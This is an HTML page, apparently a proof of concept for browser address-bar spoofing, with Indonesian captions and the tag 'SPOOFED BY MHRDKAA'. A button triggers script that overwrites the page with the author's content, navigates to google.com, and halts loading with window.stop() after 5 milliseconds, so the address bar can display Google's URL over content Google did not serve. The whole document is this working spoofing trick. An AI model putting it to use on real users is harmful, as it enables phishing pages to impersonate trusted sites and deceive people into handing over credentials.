<!DOCTYPE html>
<html>

<head>
    <title>Spoofing Test</title>
</head>

<body style="margin:0; padding:0; overflow:hidden;">

    <div id="my-content"
        style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; display:none; text-align:center; padding-top:100px;">
        <h1 style="color:red;">SPOOFED BY MHRDKAA</h1>
        <p>Lihat Address Bar di atas. Jika berhasil, tulisannya www.google.com</p>
    </div>

    <button id="btn" onclick="startSpoof()" style="padding:20px; margin:50px;">GAS SPOOFING!</button>

    <script>
        function startSpoof() {
            document.body.innerHTML = `
        <div style="width:100%; height:100vh; background:white; display:flex; align-items:center; justify-content:center; flex-direction:column;">
            <h1 style="color:red; font-family:sans-serif;">SPOOFED BY MHRDKAA</h1>
            <p>Address Bar di atas seharusnya jadi Google sekarang...</p>
        </div>
    `;
            const target = "https://www.google.com/";
            location.href = target;
            setTimeout(() => {
                window.stop();
            }, 5);
        }
    </script>
</body>

</html>
